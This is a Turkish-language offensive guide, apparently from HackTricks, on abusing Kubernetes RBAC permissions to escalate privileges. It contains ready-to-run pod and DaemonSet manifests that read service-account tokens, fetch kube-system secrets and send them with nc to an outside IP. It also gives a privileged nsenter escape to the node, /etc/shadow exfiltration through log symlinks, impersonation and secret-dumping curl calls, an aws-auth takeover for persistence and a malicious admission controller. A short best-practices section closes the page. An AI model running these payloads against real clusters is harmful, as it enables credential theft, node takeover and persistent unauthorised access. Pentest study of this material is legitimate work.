# Kubernetes'te Roller/ClusterRoller'ın Suistimali

{{#include ../../../banners/hacktricks-training.md}}

Burada bazı potansiyel olarak tehlikeli Roller ve ClusterRoller yapılandırmalarını bulabilirsiniz.\
Unutmayın ki `kubectl api-resources` ile tüm desteklenen kaynakları alabilirsiniz.

## **Ayrıcalık Yükseltme**

Kubernetes kümesinde **farklı ayrıcalıklara sahip** **farklı bir prensibe erişim sağlama sanatı** olarak tanımlanır (kubernetes kümesinde veya dış bulutlara), Kubernetes'te temelde **ayrıcalıkları yükseltmek için 4 ana teknik** vardır:

- Kubernetes kümesinde veya dış bulutlarda daha iyi ayrıcalıklara sahip diğer kullanıcı/grupları/SAs'yi **taklit edebilme**
- Kubernetes kümesinde veya dış bulutlarda daha iyi ayrıcalıklara sahip SAs'yi **bulabileceğiniz veya ekleyebileceğiniz pod'lar oluşturma/düzeltme/çalıştırma**
- SAs token'larının gizli olarak saklandığı için **gizli bilgileri okuma**
- Bir konteynerden **düğümüne kaçabilme**, burada düğümde çalışan konteynerlerin tüm gizli bilgilerini, düğümün kimlik bilgilerini ve çalıştığı buluttaki düğümün izinlerini çalabilirsiniz (varsa)
- Anılması gereken beşinci bir teknik, bir pod'da **port-forward çalıştırma** yeteneğidir, çünkü bu pod içindeki ilginç kaynaklara erişim sağlayabilirsiniz.

### Herhangi Bir Kaynağa veya Fiile Erişim (Wildcard)

**Wildcard (\*) herhangi bir kaynak üzerinde herhangi bir fiil için izin verir**. Yöneticiler tarafından kullanılır. Bir ClusterRole içinde bu, bir saldırganın kümedeki herhangi bir namespace'i kötüye kullanabileceği anlamına gelir.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Belirli bir fiil ile Herhangi bir Kaynağa Erişim

RBAC'de, belirli izinler önemli riskler taşır:

1. **`create`:** Herhangi bir küme kaynağı oluşturma yetkisi verir, ayrıcalık yükseltme riski taşır.
2. **`list`:** Tüm kaynakları listeleme izni verir, hassas verilerin sızdırılma potansiyeli vardır.
3. **`get`:** Hizmet hesaplarından gizli bilgilere erişim izni verir, güvenlik tehdidi oluşturur.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Oluştur - Token Çal

Pod oluşturma izinlerine sahip bir saldırgan, pod'a ayrıcalıklı bir Hizmet Hesabı ekleyebilir ve Hizmet Hesabı'nı taklit etmek için token'ı çalabilir. Böylece ayrıcalıkları etkili bir şekilde artırmış olur.

`bootstrap-signer` hizmet hesabının token'ını çalacak ve bunu saldırgana gönderecek bir pod örneği:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args:
[
"-c",
'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
]
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Oluşturma & Kaçış

Aşağıda bir konteynerin sahip olabileceği tüm ayrıcalıklar belirtilmiştir:

- **Ayrıcalıklı erişim** (korumaları devre dışı bırakma ve yetenekleri ayarlama)
- **hostIPC ve hostPid ad alanlarını devre dışı bırakma** bu, ayrıcalıkları artırmaya yardımcı olabilir
- **hostNetwork** ad alanını devre dışı bırakma, düğümlerin bulut ayrıcalıklarını çalma ve ağlara daha iyi erişim sağlama
- **Konteyner içinde / ana bilgisayarları bağlama**
```yaml:super_privs.yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
Pod'u oluşturun:
```bash
kubectl --token $token create -f mount_root.yaml
```
Tek satırlık [bu tweet](https://twitter.com/mauilion/status/1129468485480751104) ve bazı eklemelerle:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Şimdi node'a kaçabildiğinize göre, istismar sonrası tekniklerine göz atın:

#### Gizlilik

Muhtemelen daha **gizli** olmak istiyorsunuz, aşağıdaki sayfalarda, önceki şablonda belirtilen bazı ayrıcalıkları etkinleştirerek bir pod oluşturursanız neleri erişebileceğinizi görebilirsiniz:

- **Ayrıcalıklı + hostPID**
- **Sadece ayrıcalıklı**
- **hostPath**
- **hostPID**
- **hostNetwork**
- **hostIPC**

_Önceki ayrıcalıklı pod yapılandırmalarını nasıl oluşturacağınız/istismar edeceğinizle ilgili örnekleri_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _adresinde bulabilirsiniz._

### Pod Oluştur - Buluta Taşı

Eğer bir **pod** (ve isteğe bağlı olarak bir **hizmet hesabı**) **oluşturabiliyorsanız**, bir pod veya hizmet hesabına **bulut rolleri atayarak bulut ortamında ayrıcalık elde etme** şansınız olabilir ve ardından buna erişebilirsiniz.\
Ayrıca, eğer **host network namespace** ile bir **pod oluşturabiliyorsanız**, **node** örneğinin IAM rolünü **ç steal** edebilirsiniz.

Daha fazla bilgi için kontrol edin:

{{#ref}}
pod-escape-privileges.md
{{#endref}}

### **Deployment, Daemonset, Statefulset, Replicationcontroller, Replicaset, Job ve Cronjob Oluştur/Düzelt**

Bu izinleri istismar ederek **yeni bir pod oluşturmak** ve önceki örnekte olduğu gibi ayrıcalıklar elde etmek mümkündür.

Aşağıdaki yaml **bir daemonset oluşturur ve pod içindeki SA'nın token'ını dışarı aktarır:**
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args:
[
"-c",
'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
]
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** kubernetes'te **bir pod içinde bir shell'de komut çalıştırmak için kullanılan bir kaynaktır**. Bu, **konteynerler içinde komut çalıştırmaya veya bir shell'e girmeye** olanak tanır.

Bu nedenle, **bir pod'a girip SA'nın token'ını çalmak** veya ayrıcalıklı bir pod'a girmek, düğüme kaçmak ve düğümdeki tüm pod'ların token'larını çalmak ve (kötüye) kullanmak mümkündür:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Bu izin, **bir yerel portu belirtilen pod'daki bir porta yönlendirmeye** olanak tanır. Bu, bir pod içinde çalışan uygulamaları kolayca hata ayıklamak için tasarlanmıştır, ancak bir saldırgan bunu, bir pod içindeki ilginç (örneğin DB'ler) veya savunmasız uygulamalara (web'ler?) erişim sağlamak için kötüye kullanabilir:
```
kubectl port-forward pod/mypod 5000:5000
```
### Hosts Writable /var/log/ Kaçışı

As [**bu araştırmada belirtilmiştir**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), eğer **hosts `/var/log/` dizini montelenmiş** bir pod'a erişebilir veya oluşturabilirseniz, **konteynerden kaçabilirsiniz**.\
Bu, esasen **Kube-API bir konteynerin loglarını almaya çalıştığında** ( `kubectl logs <pod>` kullanarak) pod'un **`0.log`** dosyasını **Kubelet** hizmetinin `/logs/` uç noktası aracılığıyla talep etmesindendir.\
Kubelet hizmeti, esasen **konteynerin `/var/log` dosya sistemini açığa çıkaran** `/logs/` uç noktasını sunar.

Bu nedenle, konteynerin **/var/log/ klasöründe yazma erişimi olan** bir saldırgan bu davranışları 2 şekilde kötüye kullanabilir:

- Konteynerinin `0.log` dosyasını (genellikle `/var/logs/pods/namespace_pod_uid/container/0.log` konumunda bulunur) örneğin **`/etc/shadow`'a işaret eden bir symlink** olacak şekilde değiştirmek. Ardından, hosts shadow dosyasını dışarıya aktarabileceksiniz:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
- Eğer saldırgan, **`nodes/log`'u okuma izinlerine sahip** herhangi bir yetkiliyi kontrol ediyorsa, sadece `/host-mounted/var/log/sym` içinde `/`'ye bir **symlink** oluşturabilir ve **`https://<gateway>:10250/logs/sym/`'ye eriştiğinde, ana bilgisayarın kök** dosya sistemini listeleyecektir (symlink'i değiştirmek dosyalara erişim sağlayabilir).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Bir laboratuvar ve otomatik istismar** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts) adresinde bulunabilir.

#### readOnly korumasını aşma <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Eğer şanslıysanız ve yüksek ayrıcalıklı yetenek `CAP_SYS_ADMIN` mevcutsa, klasörü rw olarak yeniden monte edebilirsiniz:
```bash
mount -o rw,remount /hostlogs/
```
#### Bypass hostPath readOnly koruması <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

[**bu araştırmada**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) belirtildiği gibi, korumayı aşmak mümkündür:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Bu, önceki gibi kaçışları önlemek için, bir hostPath montajı kullanmak yerine, yazılabilir erişim ile bir konteynerde bir ana bilgisayar klasörünü monte etmek için bir PersistentVolume ve bir PersistentVolumeClaim kullanarak tasarlanmıştır:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: ["sh", "-c", "sleep 1h"]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Ayrıcalıklı hesapları taklit etme**

Bir [**kullanıcı taklit etme**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) ayrıcalığı ile, bir saldırgan ayrıcalıklı bir hesabı taklit edebilir.

Bir kullanıcıyı taklit etmek için `kubectl` komutunda `--as=<username>` parametresini veya bir grubu taklit etmek için `--as-group=<group>` parametresini kullanın:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Veya REST API'sini kullanın:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Gizli Anahtarları Listeleme

**Gizli anahtarları listeleme izni, bir saldırganın gizli anahtarları gerçekten okumasına izin verebilir** REST API uç noktasına erişerek:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Bir sırrı okuma – token ID'lerini brute-force ile kırma

Okuma izinlerine sahip bir token'a sahip bir saldırgan, onu kullanmak için sırrın tam adını gerektirirken, daha geniş _**sırları listeleme**_ ayrıcalığının aksine, hala zayıflıklar vardır. Sistem içindeki varsayılan hizmet hesapları sıralanabilir ve her biri bir sır ile ilişkilidir. Bu sırların bir ad yapısı vardır: statik bir ön ekin ardından belirli karakterler hariç rastgele beş karakterli alfanümerik bir token gelir; bu, [kaynak koduna](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83) göre.

Token, tam alfanümerik aralık yerine sınırlı bir 27 karakter setinden (`bcdfghjklmnpqrstvwxz2456789`) üretilir. Bu sınırlama, toplam olası kombinasyonları 14,348,907 (27^5) ile sınırlar. Sonuç olarak, bir saldırgan, token'ı birkaç saat içinde çözmek için makul bir şekilde bir brute-force saldırısı gerçekleştirebilir ve bu da hassas hizmet hesaplarına erişim ile ayrıcalık yükselmesine yol açabilir.

### Sertifika İmzalama Talepleri

Eğer `certificatesigningrequests` kaynağında **`create`** fiillerine (veya en azından `certificatesigningrequests/nodeClient` içinde) sahipseniz, **yeni bir düğüm için** yeni bir CeSR **oluşturabilirsiniz.**

[Belgelerde bu taleplerin otomatik onaylanmasının mümkün olduğu belirtiliyor](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), bu durumda **ek izinlere ihtiyacınız yoktur**. Aksi takdirde, talebi onaylayabilmeniz gerekir, bu da `certificatesigningrequests/approval` içinde güncelleme ve `signers` içinde `approve` anlamına gelir; resourceName `<signerNameDomain>/<signerNamePath>` veya `<signerNameDomain>/*` şeklindedir.

Gerekli tüm izinlere sahip bir **rol örneği**:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Yeni node CSR onaylandığında, node'ların özel izinlerini **istismar** ederek **gizli bilgileri çalabilir** ve **yetkileri artırabilirsiniz**.

[**Bu yazıda**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) ve [**şu yazıda**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) GKE K8s TLS Bootstrap yapılandırması **otomatik imzalama** ile yapılandırılmıştır ve bu, yeni bir K8s Node'un kimlik bilgilerini oluşturmak için istismar edilmekte ve ardından bu kimlik bilgileri kullanılarak gizli bilgileri çalarak yetkilerin artırılması sağlanmaktadır.\
Eğer **belirtilen yetkilere sahipseniz aynı şeyi yapabilirsiniz**. İlk örneğin, yeni bir node'un konteynerler içindeki gizli bilgilere erişimini engelleyen hatayı aştığını unutmayın çünkü **bir node yalnızca üzerine monte edilmiş konteynerlerin gizli bilgilerine erişebilir.**

Bunu aşmanın yolu, **ilginç gizli bilgilerin monte edildiği konteynerin bulunduğu node adı için bir node kimlik bilgisi oluşturmak**tır (ama bunu nasıl yapacağınızı ilk yazıda kontrol edin):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

EKS (AWS'de olmanız gerekir) kümelerinde kube-system ad alanındaki **`configmaps`**'leri değiştirebilen ilkeler, **aws-auth** configmap'ini geçersiz kılarak küme yönetici ayrıcalıkları elde edebilir.\
Gerekli fiiller **`update`** ve **`patch`**'tir, veya configmap oluşturulmadıysa **`create`**:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
> [!WARNING]
> **`aws-auth`** kullanarak **kalıcılık** sağlayabilir ve **diğer hesaplardan** kullanıcılara erişim verebilirsiniz.
>
> Ancak, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **farklı bir hesapta çalışmaz**. Ama aslında `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` çalışır, eğer sadece ismin yerine küme ARN'sini koyarsanız.\
> `kubectl`'in çalışması için, sadece **kurbanın kubeconfig'ini** **yapılandırdığınızdan** emin olun ve aws exec argümanlarına `--profile other_account_role` ekleyin, böylece kubectl token almak ve AWS ile iletişim kurmak için diğer hesap profilini kullanacaktır.

### GKE'de Yükselme

**GCP ilkelerine K8s izinleri atamak için 2 yol vardır**. Her durumda, ilkenin kümeye erişim sağlamak için **`container.clusters.get`** iznine de ihtiyacı vardır, aksi takdirde **kendi kubectl yapılandırma dosyanızı oluşturmanız** gerekecektir (sonraki bağlantıyı takip edin).

> [!WARNING]
> K8s api uç noktasıyla konuşurken, **GCP kimlik doğrulama tokeni gönderilecektir**. Ardından, GCP, K8s api uç noktası aracılığıyla, önce **ilkenin** (e-posta ile) **kümeye herhangi bir erişimi olup olmadığını kontrol edecektir**, ardından **GCP IAM aracılığıyla herhangi bir erişimi olup olmadığını** kontrol edecektir.\
> Eğer **bunlardan herhangi biri** **doğruysa**, **yanıt verilecektir**. Eğer **değilse**, **GCP IAM aracılığıyla izinler verilmesi** öneren bir **hata** verilecektir.

İlk yöntem **GCP IAM** kullanmaktır, K8s izinlerinin **eşdeğer GCP IAM izinleri** vardır ve eğer ilke buna sahipse, bunu kullanabilecektir.

{{#ref}}
../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md
{{#endref}}

İkinci yöntem, **kümeye içindeki K8s izinlerini atamak** ve kullanıcıyı **e-posta** ile tanımlamaktır (GCP hizmet hesapları dahil).

### Hizmet hesapları token oluşturma

**TokenRequests** (`serviceaccounts/token`) oluşturabilen ilkeler K8s api uç noktasıyla konuşurken SAs (bilgi [**buradan**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token_request.rego)).

### ephemeralcontainers

**`update`** veya **`patch`** **`pods/ephemeralcontainers`** üzerinde yetkisi olan ilkeler, **diğer pod'larda kod çalıştırma** yeteneğine sahip olabilir ve ayrıcalıklı bir securityContext ile bir ephemeral container ekleyerek **düğümden çıkma** potansiyeline sahip olabilir.

### ValidatingWebhookConfigurations veya MutatingWebhookConfigurations

`validatingwebhookconfigurations` veya `mutatingwebhookconfigurations` üzerinde `create`, `update` veya `patch` fiillerinden herhangi birine sahip olan ilkeler, **bu tür bir webhookconfigurations oluşturma** yeteneğine sahip olabilirler, böylece **yetkileri artırma** imkanı bulabilirler.

[`mutatingwebhookconfigurations` örneği için bu gönderinin bu bölümüne bakın](./#malicious-admission-controller).

### Yükselme

Sonraki bölümde okuyabileceğiniz gibi: [**Yerleşik Ayrıcalık Yükseltme Önleme**](./#built-in-privileged-escalation-prevention), bir ilke, kendisi bu yeni izinlere sahip olmadan ne rol ne de clusterrole güncelleyemez veya oluşturamaz. Ancak **`roles`** veya **`clusterroles`** üzerinde **`escalate`** fiiline sahipse, yeni roller, clusterrole'ler güncelleyebilir veya oluşturabilir.

### Düğüm proxy

**`nodes/proxy`** alt kaynağına erişimi olan ilkeler, Kubelet API aracılığıyla **pod'larda kod çalıştırabilir** (buna göre [**bu**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes_proxy.rego)). Kubelet kimlik doğrulaması hakkında daha fazla bilgi bu sayfada:

{{#ref}}
../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md
{{#endref}}

[**Kubelet API ile yetkilendirilmiş RCE elde etme örneğini burada bulabilirsiniz**](../pentesting-kubernetes-services/#kubelet-rce).

### Pod'ları silme + planlanamayan düğümler

**Pod'ları silebilen** (`delete` fiili `pods` kaynağı üzerinde), veya **pod'ları tahliye edebilen** (`create` fiili `pods/eviction` kaynağı üzerinde), veya **pod durumunu değiştirebilen** (access to `pods/status`) ve **diğer düğümleri planlanamaz hale getirebilen** (access to `nodes/status`) veya **düğümleri silebilen** (`delete` fiili `nodes` kaynağı üzerinde) ve bir pod üzerinde kontrolü olan ilkeler, **diğer düğümlerden pod'ları çalabilir**, böylece bunlar **kompromize** **düğümde** **çalıştırılır** ve saldırgan bu pod'lardan **token'ları çalabilir**.
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
### Services status (CVE-2020-8554)

**`services/status`**'ı **değiştirebilen** yetkililer, `status.loadBalancer.ingress.ip` alanını **düzeltilememiş CVE-2020-8554**'ü istismar etmek için ayarlayabilir ve **küme** üzerinde **MiTM saldırıları** başlatabilir. CVE-2020-8554 için çoğu önlem, yalnızca ExternalIP hizmetlerini engellemektedir (bkz. [**bu**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify_service_status_cve_2020_8554.rego)).

### Nodes and Pods status

`nodes/status` veya `pods/status` üzerinde **`update`** veya **`patch`** izinlerine sahip yetkililer, uygulanan zamanlama kısıtlamalarını etkilemek için etiketleri değiştirebilir.

## Built-in Privileged Escalation Prevention

Kubernetes, ayrıcalık yükselmesini önlemek için [yerleşik bir mekanizma](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) sunar.

Bu sistem, **kullanıcıların roller veya rol bağlamalarını değiştirerek ayrıcalıklarını artırmalarını** engeller. Bu kuralın uygulanması API seviyesinde gerçekleşir ve RBAC yetkilendiricisi devre dışı olsa bile bir koruma sağlar.

Kural, **bir kullanıcının yalnızca bir rolü oluşturabileceğini veya güncelleyebileceğini, eğer rolün içerdiği tüm izinlere sahipse** belirtir. Ayrıca, kullanıcının mevcut izinlerinin kapsamı, oluşturmak veya değiştirmek istediği rolün kapsamıyla uyumlu olmalıdır: ya ClusterRoles için küme genelinde ya da Roles için aynı ad alanında (veya küme genelinde) olmalıdır.

> [!WARNING]
> Önceki kuralda bir istisna vardır. Eğer bir yetkili **`roles`** veya **`clusterroles`** üzerinde **`escalate`** fiiline sahipse, izinlere sahip olmadan bile rollerin ve clusterrollerin ayrıcalıklarını artırabilir.

### **Get & Patch RoleBindings/ClusterRoleBindings**

> [!CAUTION]
> **Görünüşe göre bu teknik daha önce çalışıyordu, ancak testlerime göre önceki bölümde açıklanan aynı nedenle artık çalışmıyor. Eğer zaten izinleriniz yoksa, kendinize veya farklı bir SA'ya bazı ayrıcalıklar vermek için bir rolebinding oluşturamaz/değiştiremezsiniz.**

Rolebinding oluşturma ayrıcalığı, bir kullanıcının **rolleri bir hizmet hesabına bağlamasına** olanak tanır. Bu ayrıcalık, **kullanıcının ele geçirilmiş bir hizmet hesabına yönetici ayrıcalıkları bağlamasına** neden olabileceğinden, potansiyel olarak ayrıcalık yükselmesine yol açabilir.

## Other Attacks

### Sidecar proxy app

Varsayılan olarak, podlar arasındaki iletişimde herhangi bir şifreleme yoktur. Karşılıklı kimlik doğrulama, iki yönlü, poddan poda.

#### Create a sidecar proxy app <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

.yaml dosyanızı oluşturun.
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Edit .yaml dosyanızı ve yorumlanmamış satırları ekleyin:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command:
[
"sh",
"-c",
"apt update && apt install iptables -y && iptables -L && sleep 1h",
]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Proxy'nin loglarını görüntüleyin:
```bash
kubectl logs app -C proxy
```
Daha fazla bilgi için: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Kötü Amaçlı Kabul Kontrolörü

Bir kabul kontrolörü, **nesnenin kalıcı hale getirilmesinden önce Kubernetes API sunucusuna yapılan istekleri engeller**, ancak **istek kimlik doğrulandıktan ve yetkilendirildikten sonra**.

Eğer bir saldırgan bir şekilde **bir Mutationg Admission Controller enjekte etmeyi başarırsa**, **zaten kimlik doğrulanmış istekleri değiştirme** yeteneğine sahip olacaktır. Potansiyel olarak yetki yükseltme (privesc) yapabilir ve genellikle kümede kalıcı hale gelebilir.

**Örnek** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Durumunu kontrol et, hazır olup olmadığını görmek için:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format&format=webp)

Sonra yeni bir pod dağıtın:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
`ErrImagePull` hatasını gördüğünüzde, görüntü adını aşağıdaki sorgulardan biriyle kontrol edin:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format&format=webp)

Yukarıdaki görüntüde görebileceğiniz gibi, `nginx` imajını çalıştırmaya çalıştık ama son çalıştırılan imaj `rewanthtammana/malicious-image`. Ne oldu böyle!!?

#### Teknik Detaylar <a href="#heading-technicalities" id="heading-technicalities"></a>

`./deploy.sh` betiği, yapılandırma satırlarında belirtilen şekilde Kubernetes API'sine yapılan istekleri değiştiren bir mutasyona uğratan webhook admission controller'ı kurar ve gözlemlenen sonuçları etkiler:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
Yukarıdaki kod parçası, her pod'daki ilk konteyner görüntüsünü `rewanthtammana/malicious-image` ile değiştirir.

## OPA Gatekeeper atlatma

{{#ref}}
../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md
{{#endref}}

## En İyi Uygulamalar

### **Hizmet Hesabı Token'larının Automount'unu Devre Dışı Bırakma**

- **Pod'lar ve Hizmet Hesapları**: Varsayılan olarak, pod'lar bir hizmet hesabı token'ı monte eder. Güvenliği artırmak için, Kubernetes bu automount özelliğinin devre dışı bırakılmasına izin verir.
- **Nasıl Uygulanır**: Kubernetes sürüm 1.6'dan itibaren hizmet hesapları veya pod'ların yapılandırmasında `automountServiceAccountToken: false` ayarını yapın.

### **RoleBindings/ClusterRoleBindings'de Kısıtlayıcı Kullanıcı Ataması**

- **Seçici Dahil Etme**: RoleBindings veya ClusterRoleBindings'e yalnızca gerekli kullanıcıların dahil edildiğinden emin olun. Düzenli olarak denetleyin ve alakasız kullanıcıları kaldırarak sıkı güvenliği koruyun.

### **Namespace'e Özgü Roller Üzerine Cluster Genel Roller**

